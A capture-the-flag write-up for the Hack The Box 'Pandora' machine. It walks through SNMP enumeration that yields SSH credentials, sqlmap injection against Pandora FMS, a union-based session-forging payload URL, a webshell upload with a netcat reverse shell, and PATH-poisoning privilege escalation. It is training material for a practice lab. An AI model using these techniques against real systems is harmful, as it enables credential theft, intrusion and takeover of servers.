# Pandora Walkthrough - Hack The 


![](https://i.imgur.com/dAJGBus.png)

In this box, I got to learn about SNMP exploitation and sqlmap. Also we have to do priviledge escalation to gain root.

## Enumaration
### nmap
```bash
┌─[r00t@parrot]─[~/HTB/pandora]
└──╼ $sudo nmap -sV -A -sT -sC 10.10.11.136
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-15 10:04 EAT
Nmap scan report for 10.10.11.136
Host is up (0.20s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp   open     http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Play | Landing
1600/tcp filtered issd
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=5/15%OT=22%CT=1%CU=33970%PV=Y%DS=2%DC=T%G=Y%TM=6280A61
OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=108%TI=Z%CI=Z%TS=A)SEQ(SP=FE
OS:%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=
OS:M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=FE88%W2=FE
OS:88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7
OS:%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=
OS:Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%
OS:RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0
OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIP
OS:CK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   221.05 ms 10.10.14.1
2   221.06 ms 10.10.11.136

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.88 seconds
┌─[r00t@parrot]─[~/HTB/pandora]
└──╼ $
```
After running the Nmap scan, i found that only port 22 (ssh) and 80 (http) were open as you can see.
I decided to visit the site and see if there was something interesting in it

![](https://i.imgur.com/zfuY6pd.png)

After looking around, i found nothing interesting. I did a directory bruteforce using ```feroxburster``` but nothing worked.
After some time of thinking, i decided to do a UDP nmap scan and see if there are services that are running.
```
┌─[r00t@parrot]─[~/HTB/pandora]
└──╼ $sudo nmap -sU -top-ports=20 10.10.11.136
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-15 10:04 EAT
Nmap scan report for 10.10.11.136
Host is up (0.23s latency).

PORT      STATE  SERVICE
53/udp    closed domain
67/udp    closed dhcps
68/udp    closed dhcpc
69/udp    closed tftp
123/udp   closed ntp
135/udp   closed msrpc
137/udp   closed netbios-ns
138/udp   closed netbios-dgm
139/udp   closed netbios-ssn
161/udp   open   snmp
162/udp   closed snmptrap
445/udp   closed microsoft-ds
500/udp   closed isakmp
514/udp   closed syslog
520/udp   closed route
631/udp   closed ipp
1434/udp  closed ms-sql-m
1900/udp  closed upnp
4500/udp  closed nat-t-ike
49152/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 16.09 seconds
```
I found that only port 161 running ```snmp```was open and not filtered.
I did a deep scan on the port, to see what version of snmp was runing.
```
┌─[✗]─[r00t@parrot]─[~/HTB/pandora]
└──╼ $sudo nmap -sU -sV -p161 10.10.11.136
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-15 10:39 EAT
Nmap scan report for 10.10.11.136
Host is up (0.30s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
Service Info: Host: pandora

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.04 seconds
┌─[r00t@parrot]─[~/HTB/pandora]
└──╼ $
```
we can see that the bo is running ```SNMPv1.``` 

## Understanding SNMP
SNMP stands for simple ntework management protocol. Used for network management and monitoring.
After some research about SNMP, I learned that, for one to retrieve information from a machine running SNMP, one sends a requestor ```GET``` along with a string to authenticate it.
SNMP, uses two strings to authenticate itself. The string is refered to as ```community string.``` The community string, they are unhashed and can be easily cracked. There are two types of this strings; *```readonly string```* and *```the write only string.```*

### Finding snmp community string
To find this string, we can use a tool called ```onesixtyone``` to bruteforce it using a wordlist.
```
┌─[r00t@parrot]─[~/HTB/pandora]
└──╼ $onesixtyone -c /usr/share/wordlists/metasploit/snmp_default_pass.txt -p 161 10.10.11.136
Scanning 1 hosts, 123 communities
10.10.11.136 [public] Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64
10.10.11.136 [public] Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64
┌─[r00t@parrot]─[~/HTB/pandora]
└──╼ $
```
We found the community string to this machine that is ```public```
## Exploiting SNMP
After successfully retrieving the community string, we can now retrieve some info from the machine with ```snmpwalk.```

```
┌─[r00t@parrot]─[~/HTB]
└──╼ $snmpwalk -v 1 -c public 10.10.11.136 > ape.txt
```
After analysing my out put in ```ape.txt,``` I found a username and password that I can use to ssh into the machine. Remember that snmp is unencrypted so information are in plain text.

![](https://i.imgur.com/HYlk1u7.png)

After I ```ssh``` in the machine, i realised that there was another account ```matt``` with the ```user.txt``` but i cannot access it. I also realised that there is another website from ```/etc/hosts```

![](https://i.imgur.com/7BSZiJB.png)

For us to visit this webpage, we will have to use a dynamic tunnel using ssh since it is running locally and not available to the public.
This can be done using this command: ```ssh -D 8080 daniel@10.10.11.136.``` Using the generated tunnel, we can set up a SOCKS5 proxy that supports DNS resolution to view the website.

![](https://i.imgur.com/HgDnYmF.png)

Now navigating to ```http://127.0.0.1/pandora_console/``` from my machine, I land to the website.

![](https://i.imgur.com/RpU8aSq.png)

We can see that the page, uses some software called ```Pandora FMS.``` I looked it up on the internet and luckily, I found that it had CVE's([here](https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained/)) available.
As shown in the article, the ```chart_generator.php``` file's session_id parameter, is vulnerable. Now I will run a SQLi with proxychain against the chart generator file. But file, I will have to cofigure ```/etc/proxychains4.conf``` file so as to enable proxy and our dynamic socks5 tunnel.

![](https://i.imgur.com/7QqrEA5.png)

Then use the below command to run the sqli attack.

```
┌─[r00t@parrot]─[~/HTB/pandora]
└──╼ $sudo proxychains sqlmap --url="http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=''" -D pandora --tables
```

![](https://i.imgur.com/dUWthw8.png)

The table that is really important, is ```tpassword_history```. Here we can find the hashes for matt and daniel. Looking at the harshes, they are md5.
```
┌─[r00t@parrot]─[~/HTB/pandora]
└──╼ $proxychains sqlmap --url="http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=''" -Ttpassword_history --dump
```

![](https://i.imgur.com/f2PFU73.png)

I also did a futher attack on the ```tsession_php``` table to get the php session ids stored.

I just added the id to the url, visiting it, we get access granted and a blank white page. Going back to the fms login page, I was automatically logged in as ```matt``` with admin privilledges.

```
http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=%27%20union%20SELECT%201,2,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20--%20x
```
Accessed as matt


![](https://i.imgur.com/C40eqRr.png)

Now we have to get a way to exploit a reverse shell.

![](https://i.imgur.com/Ji5s8yp.gif)

### Getting Reverse shell
Looking at the Pandora FMS [CVE-2020-5544](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5844) we can see that all the exploits require file upload, in order to get RCE. 
I interacted with the tool and lucky, I found a file manager section that allows a file upload. I just got a webshell file online and uploaded it.

![](https://i.imgur.com/6LNEqtK.png)

Lets visit the php file we uploaded
![](https://i.imgur.com/Z0QmcH5.png)
And yes, we got a shell. Now I connected it to my machine using netcat listener on port 4242 as shown below 
listening using ```nc -nvlp 4242```

![](https://i.imgur.com/cQbmXMq.png)

we get a connection back. Lets now read the user hash.

![](https://i.imgur.com/cM4HKeW.png)
 
## Priviledge escalation
For a nice and stable shell, we can copy the machiens ```id_rsa,``` and use ssh to login.

Searching for a while, usign find command to seacrh for files with Setuid permisions, We can see one that seems interesting```/usr/bin/pandora_backup.``` 


![](https://i.imgur.com/ju7VVuf.png)
 
After running the file ```/usr/bin/pandora_backup``` and analysing it, we see that its using tar to compress the PandoraFSM.

So lets try to [poison](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/) the path and run the file again to escalate our privileges.

![](https://i.imgur.com/pkko3Sm.png)


Congratulations!!! Pandora has been pwned

![](https://i.imgur.com/MaLSWK2.png)

Finally we solved the lab and thank you so much for your time, if you liked this writeup and you feel it’s helpful then please share it with your friends. 
Happy hacking!


[![](https://i.imgur.com/WKRV9rx.png)](https://www.buymeacoffee.com/k0r3s)
